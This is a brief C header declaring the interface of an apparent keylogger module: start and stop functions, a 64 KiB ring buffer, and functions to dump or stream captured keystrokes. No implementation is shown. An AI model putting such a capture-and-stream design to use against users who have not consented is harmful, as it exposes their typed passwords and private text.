#ifndef KEYLOG_H
#define KEYLOG_H

#define KEYLOG_RING_SIZE (64*1024)

void keylog_start(void);
void keylog_stop(void);
int keylog_dump(char* out, int outsz);
int keylog_stream(char* out, int outsz);

#endif
